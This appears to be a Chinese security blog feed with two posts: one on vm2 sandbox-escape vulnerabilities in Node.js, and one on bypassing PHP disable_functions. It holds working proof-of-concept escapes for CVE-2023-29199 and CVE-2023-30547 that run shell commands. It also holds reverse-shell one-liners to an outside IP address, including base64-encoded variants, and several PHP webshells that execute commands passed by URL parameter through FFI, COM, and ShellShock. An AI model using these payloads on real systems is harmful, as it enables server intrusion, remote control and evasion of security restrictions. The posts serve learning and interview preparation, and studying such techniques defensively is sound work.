<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">aa</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;1=1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">aa</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过async产生一个未处理的异步异常  </span></span><br><span class="line"><span class="comment">// eval()在aa函数中跑出一个语法错误来触发一个未处理的异步错误</span></span><br></pre></td></tr></table></figure>



<h4 id="CVE-2023-29199"><a href="#CVE-2023-29199" class="headerlink" title="CVE-2023-29199"></a>CVE-2023-29199</h4><p>影响版本 &lt;=3.9.15  </p>
<p>这里有篇 transformer的源码分析的文章 可参考 <a href="https://blog.csdn.net/Yy_Rose/article/details/127534335">https://blog.csdn.net/Yy_Rose/article/details/127534335</a></p>
<p>攻击者可以使用<code>$tmpname</code>的标识符去绕过 handleExecption()实现沙箱逃逸到达rce的效果</p>
<h5 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>问题出现在transformer.js 下的transformer函数，先简单看一下transformer的代码</p>
<p>在transform.js中 先导入了acron(js的一个解析器) 和 acorn-walk(提供遍历) ，然后定义了一个字符串对象INTERNAL_STATE_NAME 后面也会再次用到</p>
<p><img src="/posts/bfeb5984/31.png" alt="img"></p>
<p>主要实现了三个函数 assertType() 、makeNiceSyntaxError()和 transformer()</p>
<p><img src="/posts/bfeb5984/32.png" alt="img"></p>
<p>asserType() 函数主要是返回node节点 如果节点为无效类型，则会抛出异常</p>
<p>makeNiceSyntaxError()`则是一个处理异常的函数 可暂且不看</p>
<p>有比较多的内容是对transformer()函数的实现，</p>
<p><img src="/posts/bfeb5984/33.png" alt="img"></p>
<p>定义一个ast， 通过acorn的解析器Parser 将js代码转换为ast.</p>
<p><img src="/posts/bfeb5984/34.png" alt="img"></p>
<p><img src="/posts/bfeb5984/35.png" alt="img"></p>
<p>判断CBody是否是为BlockStatement代码块语句</p>
<p><img src="/posts/bfeb5984/36.png" alt="img"></p>
<p><img src="/posts/bfeb5984/37.png" alt="img"></p>
<p>当通过try捕获的参数为undefined未定义时，则会抛出makeNiceSyntaxError异常，前文中的catch处将被更改内容，INTERNAL_STATE_NAME会被调用，并报错Use of internal vm2 state variable，会执行catch后的内容。</p>
<p>在catch的code处 <code>$&#123;name&#125;=$&#123;INTERNAL_STATE_NAME&#125;.handleException($&#123;name&#125;)</code>  <code>catch($tmpname)&#123;try&#123;throw $&#123;INTERNAL_STATE_NAME&#125;.handleException($tmpname);&#125;</code></p>
<p><img src="/posts/bfeb5984/38.png" alt="img"></p>
<p>tmpname的值被定义为<code>VM2_INTERNAL_TMPNAME</code></p>
<p><img src="/posts/bfeb5984/39.png" alt="img"></p>
<p>在poc中 攻击者构造了 <code>a$tmpname</code> ，经过函数处理后变为 <code>aVM2_INTERNAL_TMPNAME</code>，而在poc中我们已提前定义好了<code>aVM2_INTERNAL_TMPNAME</code>这个变量，使得这个变量作为宿主对象可以未经保护直接使用，从而实现了对<code>handleException()</code>的绕过</p>
<p>poc <a href="https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c">https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">aVM2_INTERNAL_TMPNAME = &#123;&#125;;</span></span><br><span class="line"><span class="string">function stack() &#123;</span></span><br><span class="line"><span class="string">    new Error().stack;</span></span><br><span class="line"><span class="string">    stack();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    stack();</span></span><br><span class="line"><span class="string">&#125; catch (a$tmpname) &#123;</span></span><br><span class="line"><span class="string">    a$tmpname.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch pwned&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2023-30547"><a href="#CVE-2023-30547" class="headerlink" title="CVE-2023-30547"></a>CVE-2023-30547</h4><p>&lt;= 3.9.16</p>
<p>POC <a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">err = &#123;&#125;;</span></span><br><span class="line"><span class="string">const handler = &#123;</span></span><br><span class="line"><span class="string">    getPrototypeOf(target) &#123;</span></span><br><span class="line"><span class="string">        (function stack() &#123;</span></span><br><span class="line"><span class="string">            new Error().stack;</span></span><br><span class="line"><span class="string">            stack();</span></span><br><span class="line"><span class="string">        &#125;)();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">const proxiedErr = new Proxy(err, handler);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    throw proxiedErr;</span></span><br><span class="line"><span class="string">&#125; catch (&#123;constructor: c&#125;) &#123;</span></span><br><span class="line"><span class="string">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch pwned&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure>







<hr>
<h3 id="nodejs下漏洞利用"><a href="#nodejs下漏洞利用" class="headerlink" title="nodejs下漏洞利用"></a>nodejs下漏洞利用</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>bash -i &gt;&amp; /dev/tcp/106.52.221.71/8888 0&gt;&amp;1</p>
<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==</p>
<p>require(‘child_process’).exec(‘echo SHELL_BASE_64|base64 -d|bash’);</p>
<p>require(‘child_process’).exec(‘echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==|base64 -d|bash’);</p>
<p>require(‘child_process’).exec(‘echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDYuNTIuMjIxLjcxLzg4ODggMD4mMQ==|base64 -d|bash’);</p>
<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/80 0&gt;&amp;1</p>
<p>看一下 child_process 子进程相关手册 <a href="https://nodejs.cn/api-v16/child_process.html">https://nodejs.cn/api-v16/child_process.html</a></p>
<p><a href="https://xz.aliyun.com/t/9167">https://xz.aliyun.com/t/9167</a>  nodejs下漏洞利用</p>
<h4 id="child-process模块"><a href="#child-process模块" class="headerlink" title="child_process模块"></a>child_process模块</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo SHELL_BASE_64|base64 -d|bash&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODAgMD4mMQ==|base64 -d|bash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvODAgMD4mMQ==|base64 -d|bash&#x27;</span>);</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">80</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="title class_">YmFzaCAtaSA</span>+<span class="title class_">JiAvZGV2L3RjcC8</span>xMjcuMC4wLjEvODAgMD4mMQ==</span><br><span class="line">  </span><br><span class="line">注意：<span class="title class_">BASE64</span>加密后的字符中有一个+号需要url编码为%2B(一定情况下)</span><br></pre></td></tr></table></figure>



<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-29017">https://nvd.nist.gov/vuln/detail/CVE-2023-29017</a></p>
<p><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>
<p><a href="https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg">https://mp.weixin.qq.com/s/OwQ3B5vjpr9ZsvOXftJoQg</a></p>
<p><a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>
<p><a href="https://xz.aliyun.com/t/9167">https://xz.aliyun.com/t/9167</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/16899212.html">https://www.cnblogs.com/zpchcbd/p/16899212.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>Disable_functions Bypass</title>
    <url>/posts/fbcae803/</url>
    <content><![CDATA[<p>通常情况下 导致webshell不能执行命令又三类原因:</p>
<ul>
<li><ol>
<li>php.ini中使用disable_funcitons禁用了system() exec()等命令执行的函数</li>
</ol>
</li>
<li><ol start="2">
<li>有WAF拦截</li>
</ol>
</li>
<li><ol start="3">
<li>web进程运行在rbash类受限制的shell环境下</li>
</ol>
</li>
</ul>
<p>如果是第一种则无法执行任何命令，另外两种可以执行少量命令。</p>
<p>在拿到的有些 webshell中，在执行命令时返回  <code>ret=127</code>，这是由于disable_functions 的限制，最近有面试官问到过这个问题，但是由于很久没接触，以前大多是使用蚁剑插件绕过，在总结复现学习下bypass技巧。</p>
<h4 id="Disable-functions"><a href="#Disable-functions" class="headerlink" title="Disable_functions"></a>Disable_functions</h4><p>disable_functions 是 php.ini中的一个设置选项，可以用来设置php环境禁止使用某些函数，主要是用来禁止某些能够执行危险命令的函数</p>
<p><img src="/posts/fbcae803/1.png" alt="img"></p>
<p>通常在拿到一个webshell 使用管理工具连接执行命令却返回 <code>ret=127 </code> 这种就是被disable_functions 所限制了。</p>
<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><p>有些运维人员可能没有将php命令执行的函数禁用完，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open</span><br></pre></td></tr></table></figure>

<h4 id="利用PHP-7-4-FFI-绕过"><a href="#利用PHP-7-4-FFI-绕过" class="headerlink" title="利用PHP 7.4 FFI 绕过"></a>利用PHP 7.4 FFI 绕过</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ol>
<li>Linux 操作系统</li>
<li>PHP&gt;= 7.4</li>
<li>开启了FFI拓展且 ffi.enable=true</li>
</ol>
<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p>
<p>当所有的PHP命令执行的函数被禁用后，可以用过PHP7.4的新特性FFI调用C代码的方式。</p>
<p>先声明C中的命令执行函数「system()」，在通过FFI变量调用system() 绕过PHP中的system函数</p>
<p>查看FFI是否开启  ffi.enable 设置为TRUE</p>
<p><img src="/posts/fbcae803/2.png" alt="img"></p>
<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><p>使用  <code>FFI::cdef</code>  //创建一个新的FFI对象</p>
<p>通过C 的 <code>system()</code>去执行命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="comment">//由GET传参的任意代码执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问  ip/1.php?cmd=whoami </p>
<h4 id="利用Linux环境变量-LD-PRELOAD绕过"><a href="#利用Linux环境变量-LD-PRELOAD绕过" class="headerlink" title="利用Linux环境变量 LD_PRELOAD绕过"></a>利用Linux环境变量 LD_PRELOAD绕过</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p>LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载</p>
<p>一般情况下动态库的搜索顺序：</p>
<ul>
<li>编译目标代码时知道的动态库搜索路径LD_PRELOAD</li>
<li>环境变量LD_LIBRARY_PATH指定的动态库搜索路径</li>
<li>配置文件/etc/ld.so.conf中指定的动态库搜索路径</li>
<li>默认的动态库搜索路径 /lib</li>
<li>默认的动态库搜索路径 /usr/lib</li>
</ul>
<p>LD_PRELOAD的优先级最高，因而可以影响程序运行时的链接，运行程序运行前优先加载动态链接库。</p>
<p>可以通过环境变量LD_PRELOAD劫持系统函数，可以达到不调用PHP的各种命令执行函数「system() exec()等」仍可执行系统命令的目的。</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>1.本地伪造.c 文件劫持某个函数并生成一个动态链接库.so 文件</p>
<p>2.上传文件到服务器有权限的目录下</p>
<p>3.利用php中的putenv()设置LD_PRELOAD路径为该文件</p>
<p>4.配合php中某个函数去厨房构造的动态链接库 .so文件</p>
<p>5.执行命令</p>
<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><p>PHP支持putenv() mail()函数  「无需安装sendmail」</p>
<p>文章可见 <a href="https://www.freebuf.com/web/192052.html">https://www.freebuf.com/web/192052.html</a></p>
<h5 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h5><p>项目地址: <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>该项目中有三个关键文件，bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so。 </p>
<p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：</p>
<p><a href="http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</a> </p>
<p>cmd参数 执行命令</p>
<p>outpath参数 保存命令执行输出结果的文件路径「注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点」</p>
<p>sopath参数  指定劫持系统函数的共享对象的绝对路径</p>
<p>将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标有权限的目录下，指定好三个 GET 参数后，并用include去包含bypass_disablefunc.php 即可突破 disable_functions。</p>
<h4 id="利用Windows-COM组件绕过"><a href="#利用Windows-COM组件绕过" class="headerlink" title="利用Windows COM组件绕过"></a>利用Windows COM组件绕过</h4><h5 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h5><p>1.Windows环境</p>
<p>2.开启COM组件「5.4自带 其他版本自行添加」</p>
<p><img src="/posts/fbcae803/3.png" alt="img"></p>
<p>如果在phpinfo中 com_dotnet下  com.allow_dcom   表示COM组件开启。可以直接实例化一个COM对象，通过调用对象方法来执行系统命令以绕过disable_functions</p>
<h5 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h5><p>上传php脚本 后传参执行命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>] : <span class="string">&#x27;wscript&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;wscript&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Create Wscript.Shell Failed!&quot;</span>); <span class="comment">//生成一个COM对象</span></span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>);	<span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">    <span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;application&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&quot;Shell.Application&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Shell.Application Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">ShellExecute</span>(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a>利用攻击PHP-FPM</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><ol>
<li>Linux操作系统</li>
<li>PHP-FPM</li>
<li>存在可写目录 需上传.so文件</li>
</ol>
<h5 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</a></p>
<p>git clone <a href="https://github.com/AntSwordProject/AntSword-Labs.git">https://github.com/AntSwordProject/AntSword-Labs.git</a> </p>
<p>cd AntSword-Labs/bypass_disable_functions/5 </p>
<p>docker-compose up -d</p>
<h5 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h5><p>连接shell后无法执行命令</p>
<p><img src="/posts/fbcae803/4.png" alt="img"></p>
<p>通过phpinfo 发现该主机配置了 FPM/Fastcgi</p>
<p><img src="/posts/fbcae803/5.png" alt="img"></p>
<p>使用插件</p>
<p>需要先找到FPM接口地址</p>
<p><img src="/posts/fbcae803/6.png" alt="img"></p>
<p><img src="/posts/fbcae803/7.png" alt="img"></p>
<p>随后在 /var/www/html/ 目录下便新建了一个 .antproxy.php文件「ant」 连接shell后便可执行命令</p>
<p><img src="/posts/fbcae803/8.png" alt="img"></p>
<h4 id="利用Apache-Mod-CGI"><a href="#利用Apache-Mod-CGI" class="headerlink" title="利用Apache Mod CGI"></a>利用Apache Mod CGI</h4><h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><ol>
<li>Linux操作系统</li>
<li>Apache + PHP「Apache使用 apache_mod_php」</li>
<li>Apche开启 cgi和rewrite</li>
<li>Web目录具有AllowOverride 权限</li>
<li>当前目录可写</li>
</ol>
<h5 id="关于mod-cgi"><a href="#关于mod-cgi" class="headerlink" title="关于mod_cgi"></a>关于mod_cgi</h5><p><a href="http://httpd.apache.org/docs/current/mod/mod_cgi.html">http://httpd.apache.org/docs/current/mod/mod_cgi.html</a></p>
<p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。</p>
<p>可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p>
<p>当Apache 开启了cgi, rewrite时，可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。</p>
<h5 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h5><p>1.在web目录下上传一个 .htaccess 文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure>

<p>2.上传shell.ant</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="keyword">echo</span> Content-type: text/html</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">echo</span>&amp;&amp;id</span><br></pre></td></tr></table></figure>

<p>直接访问 shell.ant 会报错，是因为权限问题</p>
<p><img src="/posts/fbcae803/9.png" alt="img"></p>
<p>3.使用蚁剑直接修改权限 从0644-&gt; 0777</p>
<p><img src="/posts/fbcae803/10.png" alt="img"></p>
<p>再次访问即可</p>
<p><img src="/posts/fbcae803/11.png" alt="img"></p>
<hr>
<p>使用蚁剑插件的方式</p>
<p><img src="/posts/fbcae803/12.png" alt="img"></p>
<p>点击开始后 会创建 一个新的 虚拟终端 </p>
<p><img src="/posts/fbcae803/13.png" alt="img"></p>
<p>可以直接执行命令</p>
<p><img src="/posts/fbcae803/14.png" alt="img"></p>
<h4 id="利用ShellShock-CVE-2014-6271"><a href="#利用ShellShock-CVE-2014-6271" class="headerlink" title="利用ShellShock CVE-2014-6271"></a>利用ShellShock CVE-2014-6271</h4><h5 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h5><ol>
<li>Linux 操作系统</li>
<li>putenv</li>
<li>mail or  error_log 不被禁用</li>
<li>/bin/bash 存在 CVE-2014-6271漏洞 (bash&lt;=4.3)/bin/sh -&gt; /bin/bash  sh默认的shell是bash</li>
<li>PHP &lt; 5.6.2</li>
</ol>
<h5 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h5><p>测试是否存在该漏洞</p>
<p>命令行输入 env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test”</p>
<p>如果输出 vulnerable 说明存在该漏洞</p>
<p><img src="/posts/fbcae803/15.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;mail&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>)!=<span class="literal">FALSE</span>)&#123;</span><br><span class="line">      <span class="variable">$tmp</span>=<span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;Not vuln (not bash)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;No output, or not vuln.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;不满足使用条件&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runcmd(&quot;whoami&quot;); // 要执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">runcmd</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="comment">// ?cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传该exp_cve2014-6271.php 到目标主机</p>
<p>包含文件即可</p>
<p><img src="/posts/fbcae803/16.png" alt="img"></p>
<p>在蚁剑虚拟终端上已经集成了对ShellShock的利用 可以在终端上直接执行命令</p>
<h4 id="利用iconv拓展"><a href="#利用iconv拓展" class="headerlink" title="利用iconv拓展"></a>利用iconv拓展</h4><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><ol>
<li>Linux操作系统</li>
<li>putenv</li>
<li>iconv</li>
<li>存在可写目录 上传.so文件</li>
<li>相比LD_PRELOAD环境下 多禁用了error_log</li>
</ol>
<h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用GCONV_PATH环境变量 加载 .so文件并在.so文件中执行命令</p>
